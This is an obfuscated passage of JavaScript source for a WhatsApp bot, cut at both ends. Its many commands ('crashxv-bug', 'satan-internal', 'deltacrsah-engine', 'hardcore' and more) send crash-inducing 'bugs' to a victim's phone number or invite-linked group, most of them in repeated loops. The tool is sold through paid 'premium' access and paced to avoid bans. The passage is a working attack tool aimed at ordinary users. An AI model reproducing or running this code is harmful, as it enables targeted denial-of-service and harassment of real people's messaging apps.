          let _0x433f55 = '' + encodeURI(_0x5cedbf);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x57a0c + "@s.whatsapp.net");
          let _0x38d095 = _0x57a0c + "@s.whatsapp.net";
          if (_0x57a0c == '6283123456789') {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x38d095, _0x433f55);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x38d095.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x38d095]);
        }
        break;
      case "vivo-id":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x2b8b1c = _0x1b3c99.split(',')[0x0];
          let _0x4bb3b8 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x2b8b1c || !_0x4bb3b8) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x4bb3b8))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x17d857 = _0x2b8b1c.replace(/[^0-9]/g, '');
          let _0x12e416 = '' + encodeURI(_0x4bb3b8);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x17d857 + "@s.whatsapp.net");
          let _0x43aa20 = _0x17d857 + '@s.whatsapp.net';
          if (_0x17d857 == '6283123456789') {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x43aa20, _0x12e416);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x43aa20.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x43aa20]);
        }
        break;
      case "crashxv-bug":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x5be5da = _0x1b3c99.split(',')[0x0];
          let _0x5ccd28 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x5be5da || !_0x5ccd28) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x5ccd28))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x5bbb93 = _0x5be5da.replace(/[^0-9]/g, '');
          let _0x38241f = '' + encodeURI(_0x5ccd28);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x5bbb93 + '@s.whatsapp.net');
          let _0x3a4523 = _0x5bbb93 + "@s.whatsapp.net";
          if (_0x5bbb93 == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x3a4523, _0x38241f);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x3a4523.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x3a4523]);
        }
        break;
      case "sys":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x16e02a = _0x1b3c99.split(',')[0x0];
          let _0x498fcb = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x16e02a || !_0x498fcb) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x498fcb))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x3c6534 = _0x16e02a.replace(/[^0-9]/g, '');
          let _0x2c39c4 = '' + encodeURI(_0x498fcb);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x3c6534 + '@s.whatsapp.net');
          let _0x3f4ab3 = _0x3c6534 + "@s.whatsapp.net";
          if (_0x3c6534 == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x3f4ab3, _0x2c39c4);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x3f4ab3.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x3f4ab3]);
        }
        break;
      case "satan-external":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0xb07e13 = _0x1b3c99.split(',')[0x0];
          let _0x401ee7 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0xb07e13 || !_0x401ee7) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x401ee7))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x28eb16 = _0xb07e13.replace(/[^0-9]/g, '');
          let _0x199af9 = '' + encodeURI(_0x401ee7);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x28eb16 + "@s.whatsapp.net");
          let _0x31ba61 = _0x28eb16 + "@s.whatsapp.net";
          if (_0x28eb16 == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x31ba61, _0x199af9);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x31ba61.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x31ba61]);
        }
        break;
      case 'satan-internal':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x2b0811 = _0x1b3c99.split(',')[0x0];
          let _0x31728a = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x2b0811 || !_0x31728a) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x31728a))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x43e697 = _0x2b0811.replace(/[^0-9]/g, '');
          let _0x2f8c78 = '' + encodeURI(_0x31728a);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x43e697 + '@s.whatsapp.net');
          let _0x4f7885 = _0x43e697 + "@s.whatsapp.net";
          if (_0x43e697 == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x4f7885, _0x2f8c78);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x4f7885.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x4f7885]);
        }
        break;
      case "internal-crash":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0xf4ec53 = _0x1b3c99.split(',')[0x0];
          let _0x4717e6 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0xf4ec53 || !_0x4717e6) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x4717e6))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x25eb6a = _0xf4ec53.replace(/[^0-9]/g, '');
          let _0x31f8bd = '' + encodeURI(_0x4717e6);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x25eb6a + "@s.whatsapp.net");
          let _0x3a7d0f = _0x25eb6a + "@s.whatsapp.net";
          if (_0x25eb6a == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x3a7d0f, _0x31f8bd);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x3a7d0f.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x3a7d0f]);
        }
        break;
      case "crash-myinter":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0xa7003a = _0x1b3c99.split(',')[0x0];
          let _0x2222a0 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0xa7003a || !_0x2222a0) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x2222a0))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x5bedde = _0xa7003a.replace(/[^0-9]/g, '');
          let _0x1bbe7d = '' + encodeURI(_0x2222a0);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x5bedde + '@s.whatsapp.net');
          let _0x40d10a = _0x5bedde + "@s.whatsapp.net";
          if (_0x5bedde == '6283123456789') {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x40d10a, _0x1bbe7d);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x40d10a.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x40d10a]);
        }
        break;
      case 'ui-grup':
        {
          if (!_0x210452) {
            return _0x5d98d9(mess.prem);
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("*HOW TO SEND BUG TO GROUP*\n\n" + (_0x1eabdf + _0x19c9fe) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + _0x19c9fe + " linkgc amount\n\nExample:\n." + _0x19c9fe + " https://chat.whatsapp.com/xxxx 10");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          if (!_0x1b3c99.split(" ")[0x0].includes('whatsapp.com')) {
            return _0x5d98d9("Link Invalid!");
          }
          let _0x44ffc5 = _0x1b3c99.split(" ")[0x0].split("https://chat.whatsapp.com/")[0x1];
          try {
            let _0x48b5f6 = _0x1b3c99.split(" ")[0x1] ? _0x1b3c99.split(" ")[0x1] : '1';
            let _0x565fad = await _0x38dbed.groupAcceptInvite(_0x44ffc5);
            await sleep(0x7d0);
            _0x29d677(_0x565fad, _0x48b5f6);
            await sleep(0x9c4);
            _0x5d98d9("*DONEâœ… BUG HAS BEEN SENT TO THE GROUP!.*");
            _0x38dbed.groupLeave(_0x565fad);
          } catch (_0x378d0d) {
            _0x5d98d9(util.format(_0x378d0d));
          }
        }
        break;
      case "internal-ui":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x473fe1 = _0x1b3c99.split(',')[0x0];
          let _0x375c12 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x473fe1 || !_0x375c12) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x375c12))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x4eb3e2 = _0x473fe1.replace(/[^0-9]/g, '');
          let _0x497f56 = '' + encodeURI(_0x375c12);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x4eb3e2 + "@s.whatsapp.net");
          let _0x172cc3 = _0x4eb3e2 + "@s.whatsapp.net";
          if (_0x4eb3e2 == '6283123456789') {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x172cc3, _0x497f56);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x172cc3.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x172cc3]);
        }
        break;
      case "deltacrsah-layer":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x5149f3 = _0x1b3c99.split(',')[0x0];
          let _0xeb9c0d = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x5149f3 || !_0xeb9c0d) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0xeb9c0d))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x5e4f4b = _0x5149f3.replace(/[^0-9]/g, '');
          let _0x52200d = '' + encodeURI(_0xeb9c0d);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x5e4f4b + '@s.whatsapp.net');
          let _0x29d768 = _0x5e4f4b + '@s.whatsapp.net';
          if (_0x5e4f4b == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x29d768, _0x52200d);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x29d768.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x29d768]);
        }
        break;
      case 'deltacrsah-engine':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x4b18b0 = _0x1b3c99.split(',')[0x0];
          let _0x8b3794 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x4b18b0 || !_0x8b3794) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x8b3794))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x4f7d7a = _0x4b18b0.replace(/[^0-9]/g, '');
          let _0x13d802 = '' + encodeURI(_0x8b3794);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x4f7d7a + "@s.whatsapp.net");
          let _0x43ae7e = _0x4f7d7a + "@s.whatsapp.net";
          if (_0x4f7d7a == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x43ae7e, _0x13d802);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x43ae7e.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x43ae7e]);
        }
        break;
      case "deltaxcrash-external":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0xc471cf = _0x1b3c99.split(',')[0x0];
          let _0x80ca4b = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0xc471cf || !_0x80ca4b) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x80ca4b))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x12b310 = _0xc471cf.replace(/[^0-9]/g, '');
          let _0x1f73f2 = '' + encodeURI(_0x80ca4b);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x12b310 + "@s.whatsapp.net");
          let _0x2992aa = _0x12b310 + '@s.whatsapp.net';
          if (_0x12b310 == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x2992aa, _0x1f73f2);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x2992aa.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x2992aa]);
        }
        break;
      case "deltaxcrash-internal":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x1e1d31 = _0x1b3c99.split(',')[0x0];
          let _0x4e2673 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x1e1d31 || !_0x4e2673) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x4e2673))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x61740 = _0x1e1d31.replace(/[^0-9]/g, '');
          let _0x14351d = '' + encodeURI(_0x4e2673);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x61740 + "@s.whatsapp.net");
          let _0x50eacf = _0x61740 + '@s.whatsapp.net';
          if (_0x61740 == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x50eacf, _0x14351d);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x50eacf.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x50eacf]);
        }
        break;
      case "deltacrsah-forme":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x401d32 = _0x1b3c99.split(',')[0x0];
          let _0x149d4a = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x401d32 || !_0x149d4a) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x149d4a))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0xde6954 = _0x401d32.replace(/[^0-9]/g, '');
          let _0x18f169 = '' + encodeURI(_0x149d4a);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0xde6954 + "@s.whatsapp.net");
          let _0x19a4dc = _0xde6954 + '@s.whatsapp.net';
          if (_0xde6954 == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x19a4dc, _0x18f169);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x19a4dc.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x19a4dc]);
        }
        break;
      case "deltacrsah-mekdi":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x4b5859 = _0x1b3c99.split(',')[0x0];
          let _0x42ad28 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x4b5859 || !_0x42ad28) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x42ad28))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x3bdda3 = _0x4b5859.replace(/[^0-9]/g, '');
          let _0x3fd4a6 = '' + encodeURI(_0x42ad28);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x3bdda3 + '@s.whatsapp.net');
          let _0x47411e = _0x3bdda3 + "@s.whatsapp.net";
          if (_0x3bdda3 == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x47411e, _0x3fd4a6);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x47411e.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x47411e]);
        }
        break;
      case "addprem":
        {
          if (!_0x215af5) {
            return _0x5d98d9(mess.only.owner);
          }
          if (!_0x1f3af4[0x0]) {
            return _0x5d98d9("Penggunaan " + (_0x1eabdf + _0x19c9fe) + " nomor\nContoh " + (_0x1eabdf + _0x19c9fe) + " 6285702447728");
          }
          prrkek = q.split('|')[0x0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          let _0x45da6c = await _0x38dbed.onWhatsApp(prrkek);
          if (_0x45da6c.length == 0x0) {
            return _0x5d98d9("Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!");
          }
          prem.push(prrkek);
          fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem));
          _0x5d98d9("Nomor " + prrkek + " Telah Menjadi Premium!");
        }
        break;
      case "maker":
      case '🌹':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0xc4455 = q.replace(/[^0-9]/g, '');
          if (_0xc4455.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x147449 = _0xc4455 + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x56dd93 = 0x0; _0x56dd93 < 0x1e; _0x56dd93++) {
            await _0x156efb(_0x147449, _0x3facec);
            await _0x4b4561(_0x147449, _0x600e6e);
            await _0x156efb(_0x147449, _0x3facec);
            await _0x4b4561(_0x147449, _0x600e6e);
            await _0x156efb(_0x147449, _0x3facec);
            await _0x4b4561(_0x147449, _0x600e6e);
            await _0x156efb(_0x147449, _0x3facec);
            await _0x4b4561(_0x147449, _0x600e6e);
            await _0x156efb(_0x147449, _0x3facec);
            await _0x4b4561(_0x147449, _0x600e6e);
            await _0x156efb(_0x147449, _0x3facec);
            await _0x4b4561(_0x147449, _0x600e6e);
            await _0x156efb(_0x147449, _0x3facec);
            await _0x4b4561(_0x147449, _0x600e6e);
            await _0x156efb(_0x147449, _0x3facec);
            await _0x4b4561(_0x147449, _0x600e6e);
            await _0x156efb(_0x147449, _0x3facec);
            await _0x4b4561(_0x147449, _0x600e6e);
            await _0x156efb(_0x147449, _0x3facec);
            await _0x4b4561(_0x147449, _0x600e6e);
          }
          await _0x5d98d9("彡 Successfully Send Bug to " + _0xc4455 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 3 minutes so that the bot is not banned.");
        }
        break;
      case 'hardcore':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x5622fd = q.replace(/[^0-9]/g, '');
          if (_0x5622fd.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x173a47 = _0x5622fd + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x3c2914 = 0x0; _0x3c2914 < 0x1e; _0x3c2914++) {
            await _0x156efb(_0x173a47, _0x3facec);
            await _0x4b4561(_0x173a47, _0x600e6e);
            await _0x28a511(_0x173a47);
            await _0x28a511(_0x173a47);
            await _0x28a511(_0x173a47);
            await _0x28a511(_0x173a47);
            await _0x28a511(_0x173a47);
            await _0x28a511(_0x173a47);
            await _0x156efb(_0x173a47, _0x3facec);
            await _0x4b4561(_0x173a47, _0x600e6e);
            await _0x156efb(_0x173a47, _0x3facec);
            await _0x4b4561(_0x173a47, _0x600e6e);
            await _0x156efb(_0x173a47, _0x3facec);
            await _0x28a511(_0x173a47);
            await _0x4b4561(_0x173a47, _0x600e6e);
            await _0x156efb(_0x173a47, _0x3facec);
            await _0x4b4561(_0x173a47, _0x600e6e);
            await _0x28a511(_0x173a47);
            await _0x28a511(_0x173a47);
            await _0x28a511(_0x173a47);
            await _0x28a511(_0x173a47);
            await _0x28a511(_0x173a47);
            await _0x28a511(_0x173a47);
            await _0x156efb(_0x173a47, _0x3facec);
            await _0x4b4561(_0x173a47, _0x600e6e);
            await _0x156efb(_0x173a47, _0x3facec);
            await _0x4b4561(_0x173a47, _0x600e6e);
            await _0x156efb(_0x173a47, _0x3facec);
            await _0x28a511(_0x173a47);
            await _0x4b4561(_0x173a47, _0x600e6e);
            await _0x156efb(_0x173a47, _0x3facec);
            await _0x4b4561(_0x173a47, _0x600e6e);
            await _0x28a511(_0x173a47);
            await _0x28a511(_0x173a47);
            await _0x28a511(_0x173a47);
            await _0x28a511(_0x173a47);
            await _0x28a511(_0x173a47);
            await _0x156efb(_0x173a47, _0x3facec);
            await _0x4b4561(_0x173a47, _0x600e6e);
            await _0x28a511(_0x173a47);
            await _0x28a511(_0x173a47);
            await _0x28a511(_0x173a47);
            await _0x28a511(_0x173a47);
            await _0x28a511(_0x173a47);
            await _0x156efb(_0x173a47, _0x3facec);
            await _0x4b4561(_0x173a47, _0x600e6e);
            await _0x156efb(_0x173a47, _0x3facec);
            await _0x4b4561(_0x173a47, _0x600e6e);
            await _0x156efb(_0x173a47, _0x3facec);
            await _0x4b4561(_0x173a47, _0x600e6e);
